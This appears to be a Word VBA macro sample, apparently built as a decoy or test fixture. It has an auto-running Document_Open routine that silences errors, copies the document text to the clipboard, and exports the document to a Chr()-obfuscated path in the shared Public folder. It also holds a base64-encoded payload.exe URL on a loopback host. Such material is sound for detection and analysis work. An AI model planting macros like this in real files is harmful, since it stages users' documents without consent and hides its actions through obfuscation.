Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim rng As Object
    On Error Resume Next
    Set rng = ActiveDocument.Range
    rng.Copy
    ActiveDocument.ExportAsFixedFormat OutputFileName:= _
        Chr(67) & Chr(58) & Chr(92) & Chr(85) & Chr(115) & Chr(101) & Chr(114) & Chr(115) & Chr(92) & Chr(80) & Chr(117) & Chr(98) & Chr(108) & Chr(105) & Chr(99) & Chr(92) & Chr(111) & Chr(98) & Chr(108) & Chr(105) & Chr(118) & Chr(105) & Chr(111) & Chr(110) & Chr(120) & Chr(95) & Chr(102) & Chr(111) & Chr(114) & Chr(109) & Chr(97) & Chr(116) & Chr(46) & Chr(112) & Chr(100) & Chr(102), ExportFormat:=wdExportFormatPDF
End Sub

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
